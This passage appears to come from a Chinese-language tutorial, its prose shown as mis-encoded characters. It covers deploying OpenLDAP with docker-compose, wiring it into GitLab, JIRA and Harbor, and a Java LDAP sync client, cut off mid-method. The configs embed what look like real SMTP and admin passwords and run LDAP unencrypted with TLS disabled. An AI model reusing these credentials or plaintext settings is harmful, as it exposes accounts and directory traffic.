PHPLDAPADMIN_HTTPS: \u0026#34;false\u0026#34; ports: - \u0026#34;50081:80\u0026#34; depends_on: - openldap self-service-password: container_name: self-service-password image: tiredofit/self-service-password:latest restart: always ports: - \u0026#34;50080:80\u0026#34; environment: - LDAP_SERVER=ldap://openldap:389 - LDAP_BINDDN=cn=admin,dc=gsymgsym,dc=com - LDAP_BINDPASS=XXXX - LDAP_BASE_SEARCH=dc=gsymgsym,dc=com - MAIL_FROM=it@open.com - MAIL_FROM_NAME=è´¦å·è‡ªåŠ©æœåŠ¡å¹³å° - SMTP_DEBUG=0 - SMTP_HOST=smtp.qiye.aliyun.com - SMTP_USER=it@open.com - SMTP_PASS=jYda52VZ8Ftw1111 - SMTP_PORT=465 - SMTP_SECURE_TYPE=ssl - SMTP_AUTH_ON=true - NOTIFY_ON_CHANGE=true volumes: - /etc/localtime:/etc/localtime - /opt/openldap/self-service-password/htdocs:/www/ssp - /opt/openldap/self-service-password/logs:/www/logs deploy: resources: limits: memory: 2G reservations: memory: 512M Docker éƒ¨ç½² docker-compose up -d\nç„¶åç‚¹å‡»Loginç™»å½•\nLogin DN æ ¹æ®docker-composeå°±æ˜¯cn=admin,dc=gsymgsym,dc=com\nPassword å°±æ˜¯LDAP_ADMIN_PASSWORDçš„è®¾ç½®é¡¹Aa123+Bb\nä¸‹å›¾çš„æŠ¥é”™æ˜¯æµ‹è¯•é”™è¯¯å¯†ç \næ­£ç¡®ç™»å½•åï¼Œå¦‚ä¸‹å›¾\nåˆ›å»ºæ•°æ® è¿™é‡Œå…ˆåœ¨dcä¸‹é¢åˆ›å»ºä¸€ä¸ªou=groupå’Œä¸€ä¸ªou=userã€‚æš‚æ—¶å…ˆä¸æŒ‰éƒ¨åˆ†åŒºåˆ†\nå¦‚æœæƒ³å†æ›´ç»†èŠ‚åŒºåˆ†çš„è¯ï¼Œåˆ™å°±å…ˆåˆ›å»ºä¸€ä¸ªouï¼Œå†åœ¨è¯¥ouä¸‹åˆ›å»ºä¸€ä¸ªou=groupå³å¯ã€‚\nåˆ›å»ºou é‡å¤æ­¤æ“ä½œï¼Œåˆ›å»ºou=userï¼Œç»“æœå¦‚ä¸‹å›¾\nåˆ›å»º Posix Group æ¥ä¸‹æ¥åˆ›å»ºPosix Groupåœ¨groupä¸‹\nåˆ›å»º User Account åœ¨ou=userä¸‹åˆ›å»ºç”¨æˆ·\nä¸ºç”¨æˆ·å¡«å†™å…¶ä»–å±æ€§ å·²æœ‰LDAPç¯å¢ƒå’Œæ•°æ®åçš„UIç™»å½• å®‰è£…phpLDAPadmin yum -y install phpldapadmin\nä¿®æ”¹phpLDAPadminçš„é…ç½®æ–‡ä»¶ vi /etc/phpldapadmin/config.php\nè¯·æŒ‰å®é™…æƒ…å†µä»¥åŠæ³¨é‡Šæç¤ºä¿®æ”¹ä»¥ä¸‹å†…å®¹ï¼Œå®Œæˆå»é™¤ # å·å’Œåé¢çš„æ³¨é‡Šï¼Œåœ¨å‘½ä»¤è¡Œçª—å£ä¸­æŒ‰ä¸‹ Gï¼ˆå¤§å†™ï¼‰ï¼Œç„¶åæŒ‰ä¸‹ Oï¼ˆå¤§å†™ï¼‰ï¼Œå°†ä¸Šé¢ä¿®æ”¹çš„å†…å®¹ç›´æ¥ç²˜è´´åˆ°å‘½ä»¤è¡Œçª—å£ä¸­ï¼Œå†æŒ‰ä¸‹ ESC ï¼Œæœ€åè¾“å…¥:wqæŒ‰å›è½¦ã€‚\n1 2 3 4 5 6 7 8 9 10 $servers = new Datastore(); $servers-\u0026gt;newServer(\u0026#39;ldap_pla\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;name\u0026#39;,\u0026#39;My LDAP Server\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;host\u0026#39;,\u0026#39;127.0.0.1\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;port\u0026#39;,389); $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;base\u0026#39;,array(\u0026#39;dc=xxx,dc=xxx\u0026#39;)); #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå $servers-\u0026gt;setValue(\u0026#39;login\u0026#39;,\u0026#39;auth_type\u0026#39;,\u0026#39;session\u0026#39;); $servers-\u0026gt;setValue(\u0026#39;login\u0026#39;,\u0026#39;bind_id\u0026#39;,\u0026#39;cn=Manager,dc=xxx,dc=xxx\u0026#39;); #ä¿®æ”¹ dc=xxx,dc=xxx ä¸ºè‡ªå·±çš„åŸŸå $servers-\u0026gt;setValue(\u0026#39;login\u0026#39;,\u0026#39;bind_pass\u0026#39;,\u0026#39;\u0026lt;å¯†ç \u0026gt;\u0026#39;); #å¡«å…¥ 5.7.1 è®¾å®šçš„æ ¹èŠ‚ç‚¹ç®¡ç†å‘˜å¯†ç  $servers-\u0026gt;setValue(\u0026#39;server\u0026#39;,\u0026#39;tls\u0026#39;,false); å¯åŠ¨httpdæœåŠ¡ å¯åŠ¨ï¼šsystemctl start httpd\nå¼€æœºå¯åŠ¨ï¼šsystemctl enable httpd\nç™»å½•phpLDAPadmin æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—® http://CentOS7IP/phpldapadmin ï¼Œç„¶åæŒ‰å›¾ç‰‡ä¸­çš„æç¤ºç™»å½•å³å¯ã€‚\né…ç½®å®Œæ•ˆæœå¦‚ä¸‹\nLDAPä¸ç¬¬ä¸‰æ–¹é›†æˆ ç¬¬ä¸‰æ–¹å¹³å°çš„é›†æˆåŸºæœ¬ä¸ŠæŒ‰ç…§æ“ä½œæ‰‹å†Œæ¥åšï¼Œæ•…ä¸åšå®éªŒ\nä»…åšè®°å½•\nLDAPå’ŒJRIAçš„é›†æˆ ç™»å½•è¿›JRIAçš„æ§åˆ¶å°ï¼ˆéœ€è¦æ˜¯ç®¡ç†å‘˜èº«ä»½ï¼‰ ç‚¹å‡»ï¼šé…ç½®â€”\u0026gt;ç”¨æˆ·ç®¡ç†â€”\u0026gt;ç”¨æˆ·ç›®å½•â€”\u0026gt;æ·»åŠ ç›®å½•â€”\u0026gt;LDAP è¡¥å……è§£é‡Š ç‰¹åˆ«è§£é‡Šå‡ ä¸ªå±æ€§çš„å«ä¹‰ï¼š\nLDAPæ¨¡å¼\nâ€œåŸºç¡€DNâ€ å¡«å†™LDAPçš„æ ¹èŠ‚ç‚¹ï¼Œç±»ä¼¼dc=zaq,dc=test; â€œé™„åŠ ç”¨æˆ·DNâ€ å¡«å†™é™åˆ¶ç”¨æˆ·æœç´¢èŒƒå›´çš„å€¼ï¼Œç±»ä¼¼ou=peopleï¼Œä¸å¡«çš„è¯ä»åŸºç¡€DNå¼€å§‹æœç´¢ï¼› â€œé™„åŠ ç»„DNâ€ å¡«å†™é™åˆ¶ç”¨æˆ·ç»„æœç´¢èŒƒå›´çš„å€¼ï¼Œå’Œä¸Šä¸€é¡¹ç±»ä¼¼ï¼› LDAPæƒé™\nåªè¯»ï¼šJIRAåªèƒ½ä»LDAPä¸­è¯»å–ç”¨æˆ·ä»¥åŠç”¨æˆ·ç»„ä¿¡æ¯ï¼Œæ‰€æœ‰å¯¹ç”¨æˆ·åŠç”¨æˆ·ç»„çš„ä¿®æ”¹ä¸èƒ½é€šè¿‡JIRAè¿›è¡Œã€‚ æœ¬åœ°åªè¯»ï¼šç›¸æ¯”åªè¯»æ¥è¯´ï¼Œå¯ä»¥åœ¨JIRAä¸­æ·»åŠ ç»„ï¼Œå¹¶ä¸”ä¼šå°†LDAPåŒæ­¥è¿‡æ¥çš„ç”¨æˆ·åŠ å…¥åˆ°è¯¥ç»„ä¸­ã€‚ è¯»å†™ï¼šä¸ä½†å¯ä»¥è¯»å–LDAPä¸Šçš„ç”¨æˆ·åŠç»„ä¿¡æ¯ï¼Œè¿˜å¯ä»¥é€šè¿‡JIRAä¿®æ”¹è¿™äº›ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯ä¼šè‡ªåŠ¨åŒæ­¥åˆ°LDAPã€‚ LDAPå’ŒConfluenceçš„é›†æˆ æ‰¾åˆ°gitlabçš„é…ç½®æ–‡ä»¶ï¼š/etc/gitlab/gitlab.rbï¼Œç„¶åä¿®æ”¹ä¸‹é¢çš„å†…å®¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 ### LDAP Settings ###! Docs: https://docs.gitlab.com/omnibus/settings/ldap.html ###! **Be careful not to break the indentation in the ldap_servers block. It is ###! in yaml format and the spaces must be retained. Using tabs will not work.** gitlab_rails[\u0026#39;ldap_enabled\u0026#39;] = true # gitlab_rails[\u0026#39;prevent_ldap_sign_in\u0026#39;] = false ###! **remember to close this block with \u0026#39;EOS\u0026#39; below** gitlab_rails[\u0026#39;ldap_servers\u0026#39;] = YAML.load \u0026lt;\u0026lt;-\u0026#39;EOS\u0026#39; main: # \u0026#39;main\u0026#39; is the GitLab \u0026#39;provider ID\u0026#39; of this LDAP server label: \u0026#39;LDAP\u0026#39; host: \u0026#39;xx.xx.xx.xx\u0026#39; ### LDAPæœåŠ¡åœ°å€ port: 389 uid: \u0026#39;uid\u0026#39; ### æŒ‡å®šç™»å½•gitlabä½¿ç”¨LDAPçš„å“ªä¸ªå­—æ®µä½œä¸ºè´¦å· bind_dn: \u0026#39;cn=admin,dc=zaq,dc=test\u0026#39; ### è¿™é‡Œç”¨è‡ªå·±çš„ç®¡ç†å‘˜è´¦å·ï¼ˆéœ€è¦ä¸€ä¸ªæœ‰readæƒé™çš„è´¦å·éªŒè¯é€šè¿‡åæœç´¢ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼‰ password: \u0026#39;XXX\u0026#39; encryption: \u0026#39;plain\u0026#39; # \u0026#34;start_tls\u0026#34; or \u0026#34;simple_tls\u0026#34; or \u0026#34;plain\u0026#34; # verify_certificates: true # smartcard_auth: false active_directory: false ### å¦‚æœæ˜¯ Active Directory LDAP server åˆ™è®¾ä¸ºtrue allow_username_or_email_login: true ### æ˜¯å¦å…è®¸emailç™»å½• # lowercase_usernames: false ### æ˜¯å¦å°†ç”¨æˆ·åè½¬ä¸ºå°å†™ block_auto_created_users: false ### æ˜¯å¦è‡ªåŠ¨åˆ›å»ºç”¨æˆ·ã€‚å¦‚æœè®¾ç½®ä¸ºtrueåˆ™è‡ªåŠ¨æ³¨å†Œçš„è´¦æˆ·æ˜¯è¢«é”å®šçš„ï¼Œéœ€è¦ç®¡ç†å‘˜è´¦æˆ·æ‰‹åŠ¨çš„ä¸ºè¿™äº›è´¦æˆ·è§£é”ï¼Œå› æ­¤æ­¤å¤„å°†å…¶è®¾ç½®ä¸ºfalseã€‚å½“è®¾ç½®ä¸ºfalseçš„æ—¶å€™ï¼Œå°±éœ€è¦ä¿è¯ï¼Œå¯¹äºç¬¬ä¸‰æ–¹ç™»å½•çš„ç”¨æˆ·å®Œå…¨å¯æ§ã€‚ base: \u0026#39;ou=people,dc=zaq,dc=com\u0026#39; ### ä»å“ªä¸ªä½ç½®æœç´¢ç”¨æˆ·ï¼Œè¿™é‡Œå¡«è‡ªå·±çš„ user_filter: \u0026#39;\u0026#39; ### è¡¨ç¤ºä»¥æŸç§è¿‡æ»¤æ¡ä»¶ç­›é€‰ç”¨æˆ·ï¼Œæ¯”å¦‚æˆ‘ä»¬åªå¸Œæœ›ç»„ä¸ºgitlabçš„ç”¨æˆ·æ¥è®¿é—®GitLabï¼Œåˆ™è¿™é‡Œå¯ä»¥è®¾ç½®ä¸ºï¼šmemberOf=ou=gitlab,ou=people,dc=zaq,dc=com #\tattributes:\t# LDAP ä¸­ç”¨æˆ·çš„å±æ€§ #\tusername: [\u0026#39;uid\u0026#39;, \u0026#39;userid\u0026#39;, \u0026#39;sAMAccountName\u0026#39;] # email: [\u0026#39;mail\u0026#39;, \u0026#39;email\u0026#39;, \u0026#39;userPrincipalName\u0026#39;] # name: \u0026#39;cn\u0026#39; # first_name: \u0026#39;givenName\u0026#39; # last_name: \u0026#39;sn\u0026#39; ## EE only group_base: \u0026#39;\u0026#39; admin_group: \u0026#39;\u0026#39; sync_ssh_keys: false EOS ä¿®æ”¹å®Œåé‡å¯GitLabï¼\næœ€åæœ€å¥½å†å–æ¶ˆGitLabçš„æ³¨å†ŒåŠŸèƒ½ï¼Œæ–°ç”¨æˆ·åªèƒ½é€šè¿‡ LDAP è®¤è¯çš„æ–¹å¼è¿›è¡Œç™»é™†ã€‚\næ‹‰å–ä»£ç æ—¶è¦ç”¨LDAPåˆ›å»ºçš„è´¦å·å¯†ç æ‹‰å–ã€‚\nLDAPå’ŒNexusçš„é›†æˆ ç™»å½•ç®¡ç†å‘˜è´¦å· LDAPå’ŒHarborçš„é›†æˆ ç‰¹åˆ«æ³¨æ„\nåœ¨æ²¡æœ‰æ·»åŠ ä»»ä½•ç”¨æˆ·ä¹‹å‰ï¼Œä½ å¯ä»¥ä¿®æ”¹è®¤è¯æ¨¡å¼ï¼ˆDatabaseæ¨¡å¼æˆ–è€…LDAPæ¨¡å¼ï¼‰, ä½†å½“Harborç³»ç»Ÿä¸­å·²ç»æœ‰è‡³å°‘ä¸€ä¸ªç”¨æˆ·ä¹‹åï¼ˆé™¤äº†adminç”¨æˆ·å¤–ï¼‰ï¼Œå°†ä¸èƒ½å¤Ÿä¿®æ”¹è®¤è¯æ¨¡å¼ã€‚\næ–°ç‰ˆæœ¬ æ–°ç‰ˆæœ¬çš„å¯ä»¥ç›´æ¥åœ¨é¡µé¢è¿›è¡Œä¿®æ”¹ï¼Œå¦‚ä¸‹ï¼š\nç™»å½•ç®¡ç†å‘˜è´¦æˆ·ï¼Œé€‰ä¸­é…ç½®ç®¡ç†\næ—§ç‰ˆæœ¬ è€ç‰ˆæœ¬åˆ™éœ€è¦ä¿®æ”¹harbor.cfgæ–‡ä»¶ï¼Œå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 ##By default the auth mode is db_auth, i.e. the credentials are stored in a local database. #Set it to ldap_auth if you want to verify a user\u0026#39;s credentials against an LDAP server. auth_mode = ldap_auth #The url for an ldap endpoint. ldap_url = xx.xx.xx.xx #A user\u0026#39;s DN who has the permission to search the LDAP/AD server. #If your LDAP/AD server does not support anonymous search, you should configure this DN and ldap_search_pwd. ldap_searchdn = cn=admin,dc=zaq,dc=test #the password of the ldap_searchdn ldap_search_pwd = xxx #The base DN from which to look up a user in LDAP/AD ldap_basedn = dc=zaq,dc=com #Search filter for LDAP/AD, make sure the syntax of the filter is correct. #ldap_filter = (objectClass=person) # The attribute used in a search to match a user, it could be uid, cn, email, sAMAccountName or other attributes depending on your LDAP/AD ldap_uid = uid #the scope to search for users, 0-LDAP_SCOPE_BASE, 1-LDAP_SCOPE_ONELEVEL, 2-LDAP_SCOPE_SUBTREE ldap_scope = 2 #Timeout (in seconds) when connecting to an LDAP Server. The default value (and most reasonable) is 5 seconds. ldap_timeout = 5 #Verify certificate from LDAP server ldap_verify_cert = true #The base dn from which to lookup a group in LDAP/AD ldap_group_basedn = ou=IT,dc=shileizcc,dc=com #filter to search LDAP/AD group ldap_group_filter = objectclass=group #The attribute used to name a LDAP/AD group, it could be cn, name ldap_group_gid = cn #The scope to search for ldap groups. 0-LDAP_SCOPE_BASE, 1-LDAP_SCOPE_ONELEVEL, 2-LDAP_SCOPE_SUBTREE ldap_group_scope = 2 Capture LDAP Data è¿™é‡Œå°è¯•æŠ“å–LDAPé€šè®¯æµé‡\nç¯å¢ƒï¼šJava1.8ï¼ŒDockerï¼ŒWireshark\nä½¿ç”¨ä¸Šæ–¹çš„Dockerfileåˆ›å»ºå¥½å®¹å™¨åï¼Œä½¿ç”¨å¦‚ä¸‹javaä»£ç è¿›è¡Œè¿æ¥\nä¸€ä¸ª Java Bean\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.study.ldapp; public class LdapUser { public String cn; public String sn; public String uid; public String userPassword; public String displayName; public String mail; public String description; public String uidNumber; public String gidNumber; /**å¿½ç•¥get\\setæ–¹æ³•**/ } ä¸€ä¸ªæ¨¡æ‹Ÿå®¢æˆ·ç«¯\næ³¨æ„ï¼ï¼ï¼\nå¦‚ä¸‹ä»£ç ç¬”è€…åªè¿è¡Œäº†é“¾æ¥è®¤è¯éƒ¨åˆ†\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 package com.study.ldapp; import java.util.ArrayList; import java.util.Hashtable; import java.util.List; import javax.naming.Context; import javax.naming.NamingEnumeration; import javax.naming.NamingException; import javax.naming.directory.Attribute; import javax.naming.directory.BasicAttribute; import javax.naming.directory.BasicAttributes; import javax.naming.directory.DirContext; import javax.naming.directory.ModificationItem; import javax.naming.directory.SearchControls; import javax.naming.directory.SearchResult; import javax.naming.ldap.Control; import javax.naming.ldap.InitialLdapContext; import javax.naming.ldap.LdapContext; public class LdapStore { public static void main(String[] args) throws NamingException { String url = \u0026#34;ldap://localhost:389/\u0026#34;; String basedn = \u0026#34;dc=gsymgsym,dc=com\u0026#34;; // basedn String root = \u0026#34;cn=admin,dc=gsymgsym,dc=com\u0026#34;; // ç”¨æˆ· String pwd =\u0026#34;Aa123+Bb\u0026#34;; // pwd LdapContext ctx=ldapConnect(url,root,pwd);//é›†å›¢ ldapè®¤è¯ List\u0026lt;LdapUser\u0026gt; jtlm=readLdap(ctx,basedn);//è·å–é›†å›¢ldapä¸­ç”¨æˆ·ä¿¡æ¯ url = \u0026#34;ldap://localhost:389/\u0026#34;; basedn = \u0026#34;dc=gsymgsym,dc=com\u0026#34;; // basedn root = \u0026#34;cn=admin,dc=gsymgsym,dc=com\u0026#34;; // ç”¨æˆ· pwd =\u0026#34;Aa123+Bb\u0026#34;; // pwd ctx=ldapConnect(url,root,pwd);//cdh ldapè®¤è¯ List\u0026lt;LdapUser\u0026gt; cdhlm=readLdap(ctx,basedn);//è·å–cdh ldapä¸­ç”¨æˆ·ä¿¡æ¯ //é€šè¿‡æ—¶é—´æˆ³åˆå§‹åŒ–ä¸€ä¸ªuid long init_uid= getNowTimeStamp(); //å¾ªç¯é›†å›¢ldapç”¨æˆ· for(int i=0;i\u0026lt;jtlm.size();i++){ LdapUser jtu=jtlm.get(i); init_uid=init_uid+i;//ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ID jtu.setGidNumber(init_uid+\u0026#34;\u0026#34;);//è®¾ç½®gid jtu.setUidNumber(init_uid+\u0026#34;\u0026#34;);//è®¾ç½®uid // if(!\u0026#34;testwx\u0026#34;.equals(jtu.getUid())) //\tcontinue; boolean not_exist =true; //å¾ªç¯åŒ¹é…cdh ldapç”¨æˆ· for(int j=0;j\u0026lt;cdhlm.size();j++){ LdapUser cdhu=cdhlm.get(j); //åŒæ–¹ç”¨æˆ·å­˜åœ¨å¹¶ä¸”å¯†ç ç›¸åŒ if( jtu.getUid().equals(cdhu.getUid()) \u0026amp;\u0026amp; jtu.getUserPassword().equals(cdhu.getUserPassword()) ){ not_exist=false; break; }else if(jtu.getUid().equals(cdhu.getUid()) \u0026amp;\u0026amp; !jtu.getUserPassword().equals(cdhu.getUserPassword())){//åŒæ–¹ç”¨æˆ·å­˜åœ¨,ä½†æ˜¯å¯†ç ä¸åŒ modifyInformation(jtu,ctx);//ä¿®æ”¹cdh ldapçš„å¯†ç ,æ”¹ä¸ºé›†å›¢ldapçš„ç”¨æˆ·å¯†ç  not_exist=false; break; } } //cdh ldapä¸­æ²¡æœ‰æ­¤ç”¨æˆ·å°±æ·»åŠ  if(not_exist){ boolean b = addGoups(jtu,ctx); if(b) addUser(jtu,ctx); } } if(ctx!=null) ctx.close(); } /** * æ·»åŠ ç»„ * @param lu * @param ctx * @return */ public static boolean addGoups(LdapUser lu,LdapContext ctx) { BasicAttributes attrsbu = new BasicAttributes(); BasicAttribute objclassSet = new BasicAttribute(\u0026#34;objectClass\u0026#34;); objclassSet.add(\u0026#34;posixGroup\u0026#34;); objclassSet.add(\u0026#34;top\u0026#34;); attrsbu.put(objclassSet); attrsbu.put(\u0026#34;cn\u0026#34;, lu.getCn());//æ˜¾ç¤ºè´¦å· attrsbu.put(\u0026#34;userPassword\u0026#34;, \u0026#34;{crypt}x\u0026#34;);//æ˜¾ç¤º attrsbu.put(\u0026#34;gidNumber\u0026#34;,lu.getGidNumber());/*æ˜¾ç¤ºç»„id */ attrsbu.put(\u0026#34;memberUid\u0026#34;, lu.getCn());//æ˜¾ç¤ºè´¦å· try { String cn=\u0026#34;cn=\u0026#34;+lu.getCn()+\u0026#34;,ou=Group,dc=tcjf,dc=com\u0026#34;; System.out.println(cn); ctx.createSubcontext(cn, attrsbu); System.out.println(\u0026#34;æ·»åŠ ç”¨æˆ·groupæˆåŠŸ\u0026#34;); return true; } catch (Exception e) { System.out.println(\u0026#34;æ·»åŠ ç”¨æˆ·groupå¤±è´¥\u0026#34;); e.printStackTrace(); return false; } } /** * æ·»åŠ ç”¨æˆ· * @param lu * @param ctx * @return */ public static boolean addUser(LdapUser lu,LdapContext ctx) { BasicAttributes attrsbu = new BasicAttributes(); BasicAttribute objclassSet = new BasicAttribute(\u0026#34;objectClass\u0026#34;); // objclassSet.add(\u0026#34;account\u0026#34;); objclassSet.add(\u0026#34;posixAccount\u0026#34;); objclassSet.add(\u0026#34;inetOrgPerson\u0026#34;); objclassSet.add(\u0026#34;top\u0026#34;); objclassSet.add(\u0026#34;shadowAccount\u0026#34;); attrsbu.put(objclassSet); attrsbu.put(\u0026#34;uid\u0026#34;, lu.getUid());//æ˜¾ç¤ºè´¦å· attrsbu.put(\u0026#34;sn\u0026#34;, lu.getSn());//æ˜¾ç¤ºå§“å attrsbu.put(\u0026#34;cn\u0026#34;, lu.getCn());//æ˜¾ç¤ºè´¦å· attrsbu.put(\u0026#34;gecos\u0026#34;, lu.getCn());//æ˜¾ç¤ºè´¦å· attrsbu.put(\u0026#34;userPassword\u0026#34;, lu.getUserPassword());//æ˜¾ç¤ºå¯†ç  attrsbu.put(\u0026#34;displayName\u0026#34;, lu.getDisplayName());//æ˜¾ç¤ºæè¿° attrsbu.put(\u0026#34;mail\u0026#34;, lu.getMail());//æ˜¾ç¤ºé‚®ç®± attrsbu.put(\u0026#34;homeDirectory\u0026#34;, \u0026#34;/home/\u0026#34; + lu.getCn());//æ˜¾ç¤ºhomeåœ°å€ attrsbu.put(\u0026#34;loginShell\u0026#34;, \u0026#34;/bin/bash\u0026#34;);//æ˜¾ç¤ºshellæ–¹å¼ attrsbu.put(\u0026#34;uidNumber\u0026#34;, lu.getUidNumber());/*æ˜¾ç¤ºid */ attrsbu.put(\u0026#34;gidNumber\u0026#34;, lu.getGidNumber());/*æ˜¾ç¤ºç»„id */ try { String dn=\u0026#34;uid=\u0026#34;+lu.getCn()+\u0026#34;,ou=People,dc=tcjf,dc=com\u0026#34;; System.out.println(dn); ctx.createSubcontext(dn, attrsbu); System.out.println(\u0026#34;æ·»åŠ ç”¨æˆ·æˆåŠŸ\u0026#34;); return true; } catch (Exception e) { System.out.println(\u0026#34;æ·»åŠ ç”¨æˆ·å¤±è´¥\u0026#34;); e.printStackTrace(); return false; } } /** * ä¿®æ”¹å±æ€§ * @param lu * @param ctx * @return */ public static boolean modifyInformation(LdapUser lu,LdapContext ctx) { try { ModificationItem[] mods = new ModificationItem[1]; String dn=\u0026#34;uid=\u0026#34;+lu.getCn()+\u0026#34;,ou=People,dc=tcjf,dc=com\u0026#34;; /*æ·»åŠ å±æ€§*/ // Attribute attr0 = new BasicAttribute(\u0026#34;description\u0026#34;, \u0026#34;æµ‹è¯•\u0026#34;); // mods[0] = new ModificationItem(DirContext.ADD_ATTRIBUTE,attr0); /*ä¿®æ”¹å±æ€§*/ Attribute attr0 = new BasicAttribute(\u0026#34;userPassword\u0026#34;, lu.getUserPassword()); mods[0] = new ModificationItem(DirContext.REPLACE_ATTRIBUTE, attr0); /*åˆ é™¤å±æ€§*/ // Attribute attr0 = new BasicAttribute(\u0026#34;description\u0026#34;, \u0026#34;æµ‹è¯•\u0026#34;); // mods[0] = new ModificationItem(DirContext.REMOVE_ATTRIBUTE, attr0); ctx.modifyAttributes(dn, mods); System.out.println(\u0026#34;ä¿®æ”¹æˆåŠŸ\u0026#34;); return true; } catch (NamingException ne) { System.out.println(\u0026#34;ä¿®æ”¹å¤±è´¥\u0026#34;); ne.printStackTrace(); return false; } } /** * åˆ é™¤ * @param dn * @param ctx * @return */ public static boolean delete(String dn,LdapContext ctx) { try { ctx.destroySubcontext(dn); return true; } catch (Exception e) { e.printStackTrace(); return false; } } /** * è·å–ldapè®¤è¯ * @param url * @param root * @param pwd * @return */ public static LdapContext ldapConnect(String url,String root,String pwd){ String factory = \u0026#34;com.sun.jndi.ldap.LdapCtxFactory\u0026#34;; String simple=\u0026#34;simple\u0026#34;; Hashtable\u0026lt;String, String\u0026gt; env = new Hashtable\u0026lt;String, String\u0026gt;(); env.put(Context.INITIAL_CONTEXT_FACTORY,factory); env.put(Context.PROVIDER_URL, url); env.put(Context.SECURITY_AUTHENTICATION, simple); env.put(Context.SECURITY_PRINCIPAL, root); env.put(Context.SECURITY_CREDENTIALS, pwd); LdapContext ctx = null; Control[] connCtls = null; try { ctx = new InitialLdapContext(env, connCtls); System.out.println( \u0026#34;è®¤è¯æˆåŠŸ:\u0026#34;+url); }catch (javax.naming.AuthenticationException e) { System.out.println(\u0026#34;è®¤è¯å¤±è´¥ï¼š\u0026#34;); e.printStackTrace(); } catch (Exception e) { System.out.println(\u0026#34;è®¤è¯å‡ºé”™ï¼š\u0026#34;); e.printStackTrace(); } return ctx; } /** * è·å–ç”¨æˆ·ä¿¡æ¯ * @param ctx * @param basedn * @return */ public static List\u0026lt;LdapUser\u0026gt; readLdap(LdapContext ctx,String basedn){ List\u0026lt;LdapUser\u0026gt; lm=new ArrayList\u0026lt;LdapUser\u0026gt;(); try { if(ctx!=null){ //è¿‡æ»¤æ¡ä»¶ String filter = \u0026#34;(\u0026amp;(objectClass=*)(uid=*))\u0026#34;; String[] attrPersonArray = { \u0026#34;uid\u0026#34;, \u0026#34;userPassword\u0026#34;, \u0026#34;displayName\u0026#34;, \u0026#34;cn\u0026#34;, \u0026#34;sn\u0026#34;, \u0026#34;mail\u0026#34;, \u0026#34;description\u0026#34; }; SearchControls searchControls = new SearchControls();//æœç´¢æ§ä»¶ searchControls.setSearchScope(2);//æœç´¢èŒƒå›´ searchControls.setReturningAttributes(attrPersonArray); //1.è¦æœç´¢çš„ä¸Šä¸‹æ–‡æˆ–å¯¹è±¡çš„åç§°ï¼›2.è¿‡æ»¤æ¡ä»¶ï¼Œå¯ä¸ºnullï¼Œé»˜è®¤æœç´¢æ‰€æœ‰ä¿¡æ¯ï¼›3.æœç´¢æ§ä»¶ï¼Œå¯ä¸ºnullï¼Œä½¿ç”¨é»˜è®¤çš„æœç´¢æ§ä»¶ NamingEnumeration\u0026lt;SearchResult\u0026gt; answer = ctx.search(basedn, filter.toString(),searchControls); while (answer.hasMore()) { SearchResult result = (SearchResult) answer.next(); NamingEnumeration\u0026lt;? extends Attribute\u0026gt; attrs = result.getAttributes().getAll(); LdapUser lu=new LdapUser(); while (attrs.hasMore()) { Attribute attr = (Attribute) attrs.next(); if(\u0026#34;userPassword\u0026#34;.equals(attr.getID())){ Object value = attr.get(); lu.setUserPassword(new String((byte [])value)); }else if(\u0026#34;uid\u0026#34;.equals(attr.getID())){ lu.setUid(attr.get().toString()); }else if(\u0026#34;displayName\u0026#34;.equals(attr.getID())){ lu.setDisplayName(attr.get().toString()); }else if(\u0026#34;cn\u0026#34;.equals(attr.getID())){ lu.setCn(attr.get().toString()); }else if(\u0026#34;sn\u0026#34;.equals(attr.getID())){ lu.setSn(attr.get().toString()); }else if(\u0026#34;mail\u0026#34;.equals(attr.getID())){ lu.setMail(attr.get().toString()); }else if(\u0026#34;description\u0026#34;.equals(attr.getID())){ lu.setDescription(attr.get().toString()); } } if(lu.getUid()!=null) lm.add(lu); } } }catch (Exception e) { System.out.println(\u0026#34;è·å–ç”¨æˆ·ä¿¡æ¯å¼‚å¸¸:\u0026#34;); e.printStackTrace(); } return lm; } /** * string è½¬ æ•°å€¼ * @param m * @return */ public static String strToint(String m){ if(m==null || \u0026#34;\u0026#34;.equals(m)) return \u0026#34;-1\u0026#34;; char [] a=m.toCharArray(); StringBuffer sbu = new StringBuffer(); for(char c:a) 